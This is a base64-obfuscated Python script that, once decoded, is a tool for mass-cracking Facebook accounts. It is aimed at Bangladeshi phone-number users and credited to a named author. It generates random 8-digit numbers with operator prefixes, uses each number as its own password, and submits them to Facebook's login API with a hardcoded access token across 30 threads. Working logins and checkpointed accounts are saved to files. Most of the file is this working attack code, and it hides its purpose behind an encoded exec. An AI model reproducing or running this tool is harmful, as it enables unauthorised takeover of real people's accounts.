#ENCRPYT BY KHALID SHAIFULLAH

#FEEL THE POWER OF KHALID

#WHATSAPP#+8801798396843

#DONT TRY TO COPY MY TOOOL 

import base64

exec(base64.b64decode("IyBLSEFMSUQgU0hBSUZVTExBSA0KIyBJVCdTIEtIQUxJRA0KaW1wb3J0IG9zLCBzeXMsIHRpbWUsIGRhdGV0aW1lLCByYW5kb20sIGhhc2hsaWIsIHJlLCB0aHJlYWRpbmcsIGpzb24sIHVybGxpYiwgY29va2llbGliLCBnZXRwYXNzDQpvcy5zeXN0ZW0oJ3JtIC1yZiAudHh0JykNCg0KZGVmIHBzYih6KToNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQ0KDQoNCnBzYignXHgxYlsxOzMybUJBTkdMQURFU0ggMDggRElHSVQgQ0xPTklORyBUT09MIElTIFNUQVJUSU5HIFBMRUFTRSBXQUlUIC4uLi4uLi4uLi4nKQ0KZm9yIG4gaW4gcmFuZ2UoNzc3Nyk6DQogICAgbm1iciA9IHJhbmRvbS5yYW5kaW50KDExMTExMTExLCA5OTk5OTk5OSkNCiAgICBzeXMuc3Rkb3V0ID0gb3BlbignLnR4dCcsICdhJykNCiAgICBwcmludCBubWJyDQogICAgc3lzLnN0ZG91dC5mbHVzaCgpDQoNCnRyeToNCiAgICBpbXBvcnQgcmVxdWVzdHMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCByZXF1ZXN0cycpDQoNCnRyeToNCiAgICBpbXBvcnQgbWVjaGFuaXplDQpleGNlcHQgSW1wb3J0RXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgbWVjaGFuaXplJykNCiAgICB0aW1lLnNsZWVwKDEpDQoNCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wNCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3Nlcg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQ0KYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpDQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkNCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSwgbWF4X3RpbWU9MSkNCmJyLmFkZGhlYWRlcnMgPSBbKCd1c2VyLWFnZW50JywgJ0RhbHZpay8xLjYuMCAoTGludXg7IFU7IEFuZHJvaWQgNC40LjI7IE5YNTUgQnVpbGQvS09UNTUwNikgW0ZCQU4vRkI0QTtGQkFWLzEwNi4wLjAuMjYuNjg7RkJCVi80NTkwNDE2MDtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2l0X0lUO0ZCUlYvNDU5MDQxNjA7RkJDUi9Qb3N0ZU1vYmlsZTtGQk1GL2FzdXM7RkJCRC9hc3VzO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0FTVVNfWjAwQUQ7RkJTVi81LjA7RkJPUC8xO0ZCQ0EveDg2OmFybWVhYmktdjdhO10nKV0NCg0KZGVmIGV4YigpOg0KICAgIHByaW50ICdbIV0gRXhpdCcNCiAgICBvcy5zeXMuZXhpdCgpDQoNCg0KZGVmIHBzYih6KToNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQ0KDQoNCmRlZiBqYWxhbih6KToNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgzLjAgLyAyMDApDQoNCg0KZGVmIHQoKToNCiAgICB0aW1lLnNsZWVwKDEpDQoNCg0KZGVmIGNiKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQoNCg0KbG9nbyA9ICIiIg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCiQkXCAgICQkXCAkJFwgICAkJFwgICQkJCQkJFwgICQkXCAgICAgICAkJCQkJCRcICQkJCQkJCRcICANCiQkIHwgJCQgIHwkJCB8ICAkJCB8JCQgIF9fJCRcICQkIHwgICAgICBcXyQkICBffCQkICBfXyQkXCANCiQkIHwkJCAgLyAkJCB8ICAkJCB8JCQgLyAgJCQgfCQkIHwgICAgICAgICQkIHwgICQkIHwgICQkIHwNCiQkJCQkICAvICAkJCQkJCQkJCB8JCQkJCQkJCQgfCQkIHwgICAgICAgICQkIHwgICQkIHwgICQkIHwNCiQkICAkJDwgICAkJCAgX18kJCB8JCQgIF9fJCQgfCQkIHwgICAgICAgICQkIHwgICQkIHwgICQkIHwNCiQkIHxcJCRcICAkJCB8ICAkJCB8JCQgfCAgJCQgfCQkIHwgICAgICAgICQkIHwgICQkIHwgICQkIHwNCiQkIHwgXCQkXCAkJCB8ICAkJCB8JCQgfCAgJCQgfCQkJCQkJCQkXCAkJCQkJCRcICQkJCQkJCQgIHwNClxfX3wgIFxfX3xcX198ICBcX198XF9ffCAgXF9ffFxfX19fX19fX3xcX19fX19ffFxfX19fX19fLyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIiIiDQpiYWNrID0gMA0Kc3VjY2Vzc2Z1bCA9IFtdDQpjcGIgPSBbXQ0Kb2tzID0gW10NCmlkID0gW10NCnByaW50ICdBVVRIT1IgOiBLSEFMSUQgU0hBSUZVTExBSCcNCnByaW50ICdGQUNFQk9PSyA6a2hhbGlkLnNoYWlmdWxsYWgub2ZmaWNpYWwnDQpwcmludCAnR0lUSFVCIDogS2hhbGlkMjAwOXNtJw0KQ29ycmVjdFVzZXJuYW1lID0gJzgtZGlnaXQtY2xvbmVyJw0KQ29ycmVjdFBhc3N3b3JkID0gJ0toQGxpZCcNCmxvb3AgPSAndHJ1ZScNCndoaWxlIGxvb3AgPT0gJ3RydWUnOg0KICAgIHVzZXJuYW1lID0gcmF3X2lucHV0KCdceDFiWzE7OTFtIFx4MWJbMTs5Mm1VU0VSTkFNRSBceDFiWzE7OTJtOiBceDFiWzE7OTJtJykNCiAgICBpZiB1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWU6DQogICAgICAgIHBhc3N3b3JkID0gcmF3X2lucHV0KCdceDFiWzE7OTFtIFx4MWJbMTs5Mm1QQVNTV09SRCBceDFiWzE7OTJtOiBceDFiWzE7OTJtJykNCiAgICAgICAgaWYgcGFzc3dvcmQgPT0gQ29ycmVjdFBhc3N3b3JkOg0KICAgICAgICAgICAgcHJpbnQgJ0xvZ2dlZCBpbiBzdWNjZXNzZnVsbHkgYXMgJyArIHVzZXJuYW1lDQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpDQogICAgICAgICAgICBsb29wID0gJ2ZhbHNlJw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21Xcm9uZyBQYXNzd29yZCcNCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2toYWxpZC5zaGFpZnVsbGFoLm9mZmljaWFsJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnXHgxYlsxOzk3bVdyb25nIFVzZXJuYW1lJw0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9raGFsaWQuc2hhaWZ1bGxhaC5vZmZpY2lhbCcpDQoNCm5hbWUgPSByYXdfaW5wdXQoJ1x4MWJbMTs5Mm1ceDFiWzE7OTJtIEVudGVyIFlvdXIgTmFtZTogJykNCm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2dyb3Vwcy90ZXJtdXgubGF0ZXN0LmNvbW1hbmQvP3JlZj1zaGFyZScpDQoNCmRlZiBtZW51KCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQgbG9nbw0KICAgIHByaW50ICdceDFiWzE7OTFtT05MWSBceDFiWzE7OTFtMDggXHgxYlsxOzkxbSBESUdJVFMgSEFDS0FCTEUgQUNDT1VOVFMgQVJFIEFWQUlMQUJMRScNCiAgICBwcmludA0KICAgIGphbGFuKCdceDFiWzE7OTJtWzFdICBceDFiWzE7OTJtR1JBTUVFTlBIT05FJykNCiAgICBqYWxhbignXHgxYlsxOzk2bVsyXSAgXHgxYlsxOzk2bVJPQkknKQ0KICAgIGphbGFuKCdceDFiWzE7OTJtWzNdICBceDFiWzE7OTJtQUlSVEVMJykNCiAgICBqYWxhbignXHgxYlsxOzk2bVs0XSAgXHgxYlsxOzk2bUJBTkdMQUxJTksnKQ0KICAgIGphbGFuKCdceDFiWzE7OTJtWzVdICBceDFiWzE7OTJtVEVMRVRBTEsnKQ0KICAgIGphbGFuKCdceDFiWzE7OTZtWzZdICBceDFiWzE7OTZtR1JBTUVFTlBIT05FIFx4MWJbMTs5MW0oTkVXKScpDQogICAgamFsYW4oJ1x4MWJbMTs5Mm1bN10gIFx4MWJbMTs5Mm1CQU5HTEFMSU5LIFx4MWJbMTs5MW0oTkVXKScpDQogICAgcHJpbnQNCiAgICBqYWxhbignXHgxYlsxOzkwbVs4XSBGSU5EIE1FIE9OIEZBQ0VCT09LIFBBR0UnKQ0KICAgIGphbGFuKCdceDFiWzE7OTBtWzldIFRPIENPTlRBQ1QgQURNSU0nKQ0KICAgIHByaW50DQogICAgamFsYW4oJ1x4MWJbMTs5N21bMDBdICBFWElUJykNCiAgICBwcmludCA1MCAqICctJw0KICAgIGFjdGlvbigpDQoNCg0KZGVmIGFjdGlvbigpOg0KICAgIGdsb2JhbCBjcGINCiAgICBnbG9iYWwgb2tzDQogICAgYmNoID0gcmF3X2lucHV0KCdcblx4MWJbMTs5Mm1ceGUyXHg5Nlx4ODRceGVmXHhiOFx4YmJceGNjXHhiN1x4Y2NceGJmXHhlMlx4OTRceGJiXHhjY1x4YmZceGUyXHg5NVx4OTBceGUyXHg5NFx4ODFceGU0XHhiOFx4ODAgICAnKQ0KICAgIGlmIGJjaCA9PSAnJzoNCiAgICAgICAgcHJpbnQgJ1shXSBGaWxsIGluIGNvcnJlY3RseScNCiAgICAgICAgYWN0aW9uKCkNCiAgICBlbGlmIGJjaCA9PSAnMSc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxNycNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnMic6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxOCcNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnMyc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxNicNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnNCc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxOScNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnNSc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxNScNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnNic6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxMycNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnNyc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCBsb2dvDQogICAgICAgIHByaW50ICdceDFiWzE7OTdtU0lNIENPREU6IFRZUEUgXHgxYlsxOzkxbTAxNCcNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXHgxYlsxOzk3bUNIT09TRSBDT0RFICA6ICcpDQogICAgICAgICAgICBrID0gJys4OCcNCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0Jw0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6DQogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkNCg0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnDQogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQ0KICAgICAgICAgICAgbWVudSgpDQoNCiAgICBlbGlmIGJjaCA9PSAnOCc6DQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2toYWxpZC5zaGFpZnVsbGFoLm9mZmljaWFsJykNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBtZW51KCkNCiAgICBlbGlmIGJjaCA9PSAnOSc6DQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2toYWxpZC52YXUuc2hhaWZ1bGxhaCcpDQogICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgbWVudSgpDQogICAgZWxpZiBiY2ggPT0gJzAwJzoNCiAgICAgICAgZXhiKCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnWyFdIEZpbGwgaW4gY29ycmVjdGx5Jw0KICAgICAgICBhY3Rpb24oKQ0KICAgIHByaW50ICdceDFiWzE7OTBtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Pj4nDQogICAgeHh4ID0gc3RyKGxlbihpZCkpDQogICAgcHNiKCdceDFiWzE7OTJtW1x4ZTJceDljXHg5NF0gVG90YWwgTnVtYmVyczogJyArIHh4eCkNCiAgICB0aW1lLnNsZWVwKDAuNSkNCiAgICBwc2IoJ1x4MWJbMTs5M21bXHhlMlx4OWNceDkzXVx4MWJbMTs5M20gUGxlYXNlIHdhaXQsIHByb2Nlc3MgaXMgcnVubmluZyAuLi4nKQ0KICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgIHBzYignXHgxYlsxOzk2bVshXSBUbyBTdG9wIFByb2Nlc3MgRmlyc3QgUHJlc3MgQ1RSTCBUaGVuIFByZXNzIHonKQ0KICAgIHRpbWUuc2xlZXAoMC41KQ0KICAgIHByaW50ICdceDFiWzE7OTBtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT4+Jw0KDQogICAgZGVmIG1haW4oYXJnKToNCiAgICAgICAgdXNlciA9IGFyZw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBvcy5ta2Rpcignc2F2ZScpDQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOg0KICAgICAgICAgICAgcGFzcw0KDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHBhc3MxID0gdXNlcg0KICAgICAgICAgICAgZGF0YSA9IGJyLm9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nICsgayArIGMgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIGMgKyBwYXNzMSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQ0KICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtLSEFMSUQtU1VDQ0VTU0ZVTF1ceDFiWzBtICcgKyBrICsgYyArIHVzZXIgKyAnIHwgJyArIHBhc3MxICsgJ1xuJyArICdcbicgKyAnXHgxYlsxOzkybSAgW0xvZ2luIE5vd11cbicNCiAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzYXZlL3N1Y2Nlc3NmdWxsLnR4dCcsICdhJykNCiAgICAgICAgICAgICAgICBva2Iud3JpdGUoayArIGMgKyB1c2VyICsgJ3wnICsgYyArIHBhc3MxICsgJ1xuJykNCiAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQ0KICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBjICsgcGFzczEpDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToNCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzk2bVtLSEFMSUQtQ0hFQ0tQT0lOVF0gXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnIHwgJyArIHBhc3MxICsgJ1x4MWJbMTs5Nm0gIFtMb2dpbiBBZnRlciAxMCBEYXlzXVxuJw0KICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvY2hlY2twb2ludC50eHQnLCAnYScpDQogICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArICd8JyArIGMgKyBwYXNzMSArICdcbicpDQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkNCiAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgYyArIHBhc3MxKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQoNCiAgICBwID0gVGhyZWFkUG9vbCgzMCkNCiAgICBwLm1hcChtYWluLCBpZCkNCiAgICBwcmludCA1MCAqICctJw0KICAgIHByaW50ICdbXHhlMlx4OWNceDkzXSBQcm9jZXNzIEhhcyBCZWVuIENvbXBsZXRlZC4uLi4nDQogICAgcHJpbnQgJ1tceGUyXHg5Y1x4OTNdIFRvdGFsIE9LL0NQIDogJyArIHN0cihsZW4ob2tzKSkgKyAnLycgKyBzdHIobGVuKGNwYikpDQogICAgcHJpbnQgJ1tceGUyXHg5Y1x4OTNdIENQIEZpbGUgSGFzIEJlZW4gU2F2ZWQgOiBzYXZlL2NoZWNrcG9pbnQudHh0Jw0KICAgIHJhd19pbnB1dCgnXG5bUHJlc3MgRW50ZXIgVG8gR28gQmFja10nKQ0KICAgIG9zLnN5c3RlbSgncHl0aG9uMiBzaDExLnB5JykNCg0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1lbnUoKQ0K"))
